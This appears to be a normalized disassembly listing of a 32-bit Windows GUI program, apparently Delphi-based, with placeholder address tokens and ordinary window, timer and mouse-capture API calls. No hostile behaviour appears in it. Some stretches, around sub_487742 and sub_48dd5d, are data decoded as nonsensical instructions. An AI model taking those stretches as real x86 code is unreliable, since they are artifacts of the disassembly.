pop ecx
pop ebp
retn
sub_479684
xor eax eax
retn
sub_479738
jmp sub_448b58
sub_479b36
jmp sub_448b58
sub_479b3d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
sub_479b53
jmp sub_448b58
sub_479c3d
jmp sub_448b58
sub_479c44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479c61
mov eax [ ebp - 0xc ]
call sub_4481b0
retn
sub_479c5a
jmp sub_448b58
sub_479c81
jmp sub_448b58
sub_479f89
jmp sub_448b58
sub_47a170
jmp sub_448b58
sub_47a888
mov eax [ eax + 0x290 ]
retn
sub_47a890
mov eax [ eax + 0x298 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47a89c
movzx eax [ eax + 0x5e ]
xor al 0x1
retn
sub_47aa34
jmp sub_448b58
sub_47ad1c
jmp sub_448b58
sub_47ad23
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47ad2c
mov eax [ eax + 0x2b0 ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_47adc4
cmp dl [ eax + 0x288 ]
je r-xdata
retn
mov [ eax + 0x288 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_492ec4
sub_47ae98
cmp [ eax + 0x2b0 ] 0x0
setne al
retn
sub_47aed4
push ebx
mov ebx eax
mov eax ebx
call sub_495cb0
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x6c ]
call sub_46df1c
sub_47af58
push ebx
mov ebx eax
mov eax ebx
call sub_495cd8
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x64 ]
call sub_46e7e4
sub_47af78
push ebx
mov ebx eax
mov eax ebx
call sub_47aa40
mov edx [ ebx + 0x2a0 ]
mov eax ebx
call sub_47ab08
pop ebx
retn
sub_47bca4
jmp sub_448b58
sub_47bcab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47bdde
jmp sub_448b58
sub_47bf84
jmp sub_448b58
sub_47bf8b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47c27d
jmp sub_448b58
sub_47c284
mov eax [ rw-data ]
call sub_47f6a8
mov [ ebp - 0x5 ] 0x1
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c2a2
add [ eax ] al
retn
sub_47c528
push ebx
cmp [ eax + 0x30a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
sub_47c548
mov eax [ eax + 0x298 ]
call sub_4730f4
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_481ac0
sub_47c6e0
jmp sub_448b58
sub_47c72d
jmp sub_448b58
sub_47c734
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c757
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
call sub_46e7bc
retn
sub_47c750
jmp sub_448b58
sub_47c757
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47c940
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47c548
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_47ccfc
mov ecx [ eax + 0x2a0 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_4676a8
sub_47cde7
jmp sub_448b58
sub_47cdee
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47ce70
call sub_47dde4
retn
sub_47ce78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_47d2b5
jmp sub_448b58
sub_47d2bc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47d5c4
push esi
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
and [ esi + 0x374 ] 0xdf
pop esi
retn
mov eax esi
mov si 0xffae
call sub_4483f8
pop esi
retn
j_sub_4488a4#9
jmp sub_4488a4
sub_47db97
jmp sub_4488a4
sub_47dcc5
jmp sub_448b58
sub_47dccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47dce9
lea eax [ ebp - 0x18 ]
call j_sub_449348
retn
sub_47dce2
jmp sub_448b58
sub_47dce9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47dcf0
push ebx
mov ebx eax
mov eax [ ebx + 0x298 ]
call sub_4730f4
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_479258
sub_47dd10
call sub_4481b0
retn
sub_47dd68
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_47ddd8
mov edx [ eax ]
call [ edx + 0xf0 ]
retn
j_sub_4488a4#8
jmp sub_4488a4
sub_47df84
xor edx edx
call sub_4795d4
retn
sub_47df8c
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4795d4
mov eax ebx
call sub_48e210
pop ebx
retn
sub_47e023
jmp sub_448b58
sub_47e02a
pop ebx
pop ecx
pop ebp
retn
sub_47e060
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_496868
push eax
call PostMessageW
pop ebx
retn
sub_47e28e
jmp sub_448b58
sub_47e32f
jmp sub_448b58
sub_47e339
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e358
mov eax [ rw-data ]
call sub_480e6c
retn
sub_47e351
jmp sub_448b58
sub_47e358
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e375
lea eax [ ebp - 0x20 ]
call j_sub_449348
retn
sub_47e36e
jmp sub_448b58
sub_47e375
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47e4c0
cmp [ eax + 0x30 ] 0x0
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4802b8
retn
retn
call sub_494c34
sub_47e888
mov edx eax
mov eax [ rw-data ]
call sub_482674
mov al 0x1
retn
sub_47e970
cmp dl [ eax + 0x330 ]
je r-xdata
retn
mov [ eax + 0x330 ] dl
call sub_47e898
sub_47e984
cmp dl [ eax + 0x331 ]
je r-xdata
retn
mov [ eax + 0x331 ] dl
call sub_47e898
sub_47e998
cmp edx [ eax + 0x35c ]
je r-xdata
retn
mov [ eax + 0x35c ] edx
call sub_47e898
sub_47e9e8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x330 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x358 ] 0x0
je r-xdata
sub_47ea90
mov eax [ eax + 0x364 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_47eed1
jmp sub_448b58
sub_47eed8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47f1f6
jmp sub_448b58
sub_47f1fd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47f344
add esp 0xffffffd8
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test [ esp + 0x24 ] 0x1
setne al
add esp 0x28
retn
sub_47f5f8
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47f604
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47f610
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47f61c
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47f628
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47f634
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47f654
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_47f670
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4246e8
pop esi
pop ebx
retn
sub_47f684
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_47f68c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4246e8
pop esi
pop ebx
retn
sub_47f6a0
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_47f77c
mov eax [ eax + 0x54 ]
call sub_424590
retn
sub_47f788
mov eax [ eax + 0x54 ]
call sub_4248a0
retn
sub_47fa6d
jmp sub_448b58
sub_47fab1
jmp sub_448b58
sub_47fab8
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_47fb48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47f904
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_449d2c
pop esi
pop ebx
retn
sub_47fbb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4246e8
pop esi
pop ebx
retn
sub_47fbc4
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_47fe07
jmp sub_448b58
sub_47fe0e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47fe14
inc [ eax + 0x88 ]
retn
sub_47fe1c
dec [ eax + 0x88 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
retn
test [ eax + 0x8a ] 0x10
je r-xdata
call sub_47fe3c
sub_47fe3c
xor edx edx
call sub_4802b8
retn
sub_4802aa
jmp sub_448b58
sub_480331
jmp sub_448b58
sub_480340
add eax 0x30
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
retn
sub_48038c
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x89 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_4803dd
jmp sub_4488a4
sub_4803e2
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_4805fc
push 0x0
push edx
push 0x0
push 0x30
call SystemParametersInfoW
retn
sub_480674
call sub_48063c
mov eax [ rw-data ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_47a7b8
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_480ca1
jmp sub_448b58
sub_480ca8
pop ebx
mov esp ebp
pop ebp
retn
sub_480e40
push ebx
inc [ eax + 0xc0 ]
cmp [ eax + 0xc0 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0x112 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_480e6c
push ebx
dec [ eax + 0xc0 ]
cmp [ eax + 0xc0 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x11a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_480e98
xor edx edx
call sub_480d98
retn
sub_480ea0
mov dl 0x1
call sub_480d98
retn
sub_4811c4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x31 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4811dc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x31 ] 0x1
je r-xdata
mov al 0x1
retn
sub_4812e3
jmp sub_448b58
sub_4812ea
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4488a4#7
jmp sub_4488a4
sub_482354
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_4823ef
jmp sub_4488a4
sub_4824ac
jmp sub_448b58
sub_4824b3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482594
jmp sub_4488a4
sub_4825cd
jmp sub_448b58
sub_4825d4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4825dc
call sub_43baec
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_482663
jmp sub_448b58
sub_48266a
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48286f
jmp sub_448b58
sub_482876
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_48296f
jmp sub_448b58
sub_482976
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_482c0e
jmp sub_448b58
sub_482c15
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_482c97
jmp sub_448b58
sub_482c9e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_482ca8
call sub_482990
retn
sub_482cb0
push ebx
mov ebx edx
mov edx ebx
xor eax eax
call sub_4478e8
pop ebx
retn
sub_482d18
mov dx 0xb008
call sub_482f8c
retn
sub_482df1
jmp sub_4488a4
sub_482df6
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
j_sub_4488a4#6
jmp sub_4488a4
sub_482f7d
jmp sub_448b58
sub_482f84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4830b9
jmp sub_448b58
sub_4831f0
push ebx
mov ebx eax
cmp [ ebx + 0x48 ] 0x0
jne r-xdata
cmp [ ebx + 0x48 ] 0x0
setne al
pop ebx
retn
lea eax [ ebx + 0x48 ]
call sub_44b8d8
call sub_41ff38
sub_483254
push ebx
mov ebx eax
movzx eax [ ebx + 0x86 ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x86 ] 0x0
sub_483585
jmp sub_448b58
sub_4835b4
jmp sub_448b58
sub_4836d6
jmp sub_448b58
sub_4836dd
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_483aa4
jmp sub_448b58
sub_483aab
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_483d2c
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
sub_483db4
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_483dc4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_4841ff
jmp sub_448b58
sub_484206
pop ebp
retn
j_sub_4488a4#5
jmp sub_4488a4
sub_4856c7
jmp sub_448b58
sub_4856ce
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4856d4
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_485648
sub_4856e4
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_485648
sub_4856f4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_485648
pop ebp
retn 0x8
sub_48570c
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_485854
push esi
mov esi eax
mov eax esi
call sub_495d54
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_48586c
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4858a4
cmp [ eax + 0x276 ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_4859b8
jmp sub_448b58
sub_4859bf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_485ba8
jmp sub_448b58
sub_485baf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_485bb8
push esi
mov esi eax
mov [ esi + 0x268 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_485bd0
push esi
mov esi eax
mov [ esi + 0x26a ] dl
mov eax esi
call sub_492060
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_485bec
push esi
mov esi eax
mov [ esi + 0x26b ] dl
mov eax esi
call sub_492060
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_485c08
push esi
mov esi eax
mov [ esi + 0x26c ] edx
mov eax esi
call sub_492060
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_485c24
push esi
mov esi eax
mov [ esi + 0x270 ] edx
mov eax esi
call sub_492060
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_485c40
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_492ec4
sub_485c54
push esi
mov esi eax
cmp dl [ esi + 0x278 ]
je r-xdata
pop esi
retn
mov [ esi + 0x278 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_485c74
movzx eax [ eax + 0x268 ]
retn
sub_485de2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x269 ] 0x0
retn
sub_485dfa
jmp sub_448b58
sub_485e7c
push esi
mov esi eax
mov [ esi + 0x279 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_4865d8
jmp sub_448b58
sub_486645
jmp sub_448b58
sub_486760
push ebx
lea ebx [ eax + 0x1d0 ]
push ebx
lea ebx [ eax + 0x1ec ]
push ebx
call sub_48668c
pop ebx
retn
sub_4868b4
mov [ eax + 0x1ad ] dl
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_486959
jmp sub_448b58
sub_486960
pop ebp
retn
sub_486964
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
call sub_423d34
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
sub_486cca
jmp sub_4488a4
sub_486ccf
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_486cec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
pop esi
retn
sub_486cf8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_4483f8
pop esi
retn
sub_486d10
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_4483f8
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_486d28
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
retn
sub_486dac
jmp sub_448b58
sub_486ded
jmp sub_448b58
sub_486df4
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_486e00
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_486e14
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_487133
jmp sub_448b58
sub_48713a
pop ebp
retn
sub_487742
dec eax
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add al al
dec ebp
inc edx
add [ eax ] dh
0xea1c0046 0x46
sub_4878e8
sbb al 0xeb
inc edx
add [ ebx + ecx * 8 ] ch
dec eax
add [ eax - 0x15 ] dl
inc edx
add ah ah

sub_4878f6
dec eax
add [ eax + 0x340042ea ] ah
jmp r-xdata
int3
sub_48792c
adc [ eax * 2 + 0x48cb5400 ] 0x0
mov [ eax * 2 + 0x48cb7800 ] dl
add [ eax - 0x67ffbaec ] dl
int3
sub_487e3b
add [ eax + eax ] ah
add [ eax ] al
hlt
sub_488ca0
sbb al 0xeb
inc edx
add [ ebx + ecx * 8 ] ch
dec eax
add [ eax - 0x15 ] dl
inc edx
add ah ah

sub_488d06
dec eax
add [ esp + edx + 0x14a80045 ] ah
inc ebp
add ah al

sub_488d12
dec eax
add [ edx + ecx * 8 ] ah
dec eax
add [ edx + ecx * 8 + 0x48 ] ch
add [ eax - 0x4bffb736 ] bh
enter 0x48 0x74

sub_48a318
shr [ ecx ] 0x49
add [ eax ] dl

sub_48a5b4
movzx edx [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_48aa8c
push 0x15
mov ecx rw-data
call sub_423ff0
retn
sub_48ac01
jmp sub_448b58
sub_48ac08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48ac2a
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ReleaseDC
retn
sub_48ac23
jmp sub_448b58
sub_48ac2a
pop ebx
mov esp ebp
pop ebp
retn
sub_48ac30
call GetCapture
call sub_48a70c
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_48aed0
push ebx
push eax
push sub_48b074
call sub_42f400
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_48aee8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_48aef0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx ]
call sub_448088
pop esi
pop ebx
retn
sub_48af04
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_42f4b4
pop ebx
retn
j_sub_4488a4#4
jmp sub_4488a4
sub_48b048
xor eax eax
retn
sub_48b04c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_48b064
retn
sub_48b068
mov eax [ rw-data ]
retn
sub_48b070
retn
sub_48b09e
jmp sub_4488a4
sub_48b0a3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48b0c0
call sub_448468
xor eax eax
mov [ rw-data ] eax
retn
sub_48b0d0
call sub_448464
xor eax eax
mov [ rw-data ] eax
retn
sub_48b0e0
retn
sub_48b1a4
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x40 ]
movzx eax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_48b1bc
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x78 ]
retn
sub_48b208
retn
sub_48b304
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x40 ]
mov si 0xffe6
call sub_4483f8
pop esi
pop ebp
retn 0x4
sub_48b3c0
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffdc
call sub_4483f8
pop esi
retn
sub_48b3d4
push esi
mov edx eax
mov eax [ eax + 0x40 ]
mov si 0xffdb
call sub_4483f8
pop esi
retn
sub_48b3e8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_48b3f4
mov al 0x1
retn
sub_48b3f8
mov eax 0x4
retn
sub_48b400
retn
sub_48bff9
jmp sub_4488a4
sub_48c2d3
jmp sub_448b58
sub_48c32f
jmp sub_448b58
sub_48c3a1
jmp sub_448b58
sub_48c3b0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_48c08c
sub_48c533
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_46e7bc
retn
sub_48c549
jmp sub_448b58
sub_48c570
jmp sub_448b58
sub_48c5f2
jmp sub_448b58
sub_48c61a
jmp sub_448b58
sub_48c621
mov esp ebp
pop ebp
retn
sub_48c6d9
jmp sub_448b58
sub_48c730
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_48c6fc
mov [ ebx + 0x58 ] esi
sub_48c884
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_48c898
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_48c981
jmp sub_448b58
sub_48c988
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48ca17
jmp sub_448b58
sub_48ca1e
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_48ca24
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_48ca6c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_48cb74
retn
sub_48cb9c
retn
sub_48cee0
xor eax eax
retn
sub_48cee4
movzx eax [ eax + 0x58 ]
retn
sub_48ceec
xor eax eax
retn
sub_48cef0
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_48cef8
mov eax [ eax + 0x30 ]
retn
sub_48cf9c
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_48d0c8
push ebx
mov ebx eax
movzx eax [ ebx + 0x5b ]
movzx eax [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_48d118
mov [ eax + 0x5d ] dl
retn
sub_48d11c
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_491fa4
sub_48d134
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_48d77d
jmp sub_448b58
sub_48d784
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48d7e4
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x160 ] edx
retn
mov [ eax + 0x158 ] 0x1
sub_48d860
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_48d878
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_48d8bc
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0xc ]
add esp 0x10
pop ebx
retn
sub_48d97d
jmp sub_448b58
sub_48d984
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48db88
push eax
xor ecx ecx
mov edx 0xb037
call sub_48f2b0
retn
sub_48dd5d
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_4483f8
sub_48de0e
jmp sub_448b58
sub_48de15
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48dee8
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_48f2b0
sub_48df00
push 0x0
xor ecx ecx
mov edx 0xe
call sub_48f2b0
retn
sub_48df10
push edx
mov edx 0xd
call sub_48f2e4
retn
sub_48df1c
mov edx [ eax + 0x9c ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_48df30
mov edx [ eax + 0x98 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_48dff5
jmp sub_448b58
sub_48dffc
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48e004
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_48f2b0
sub_48e074
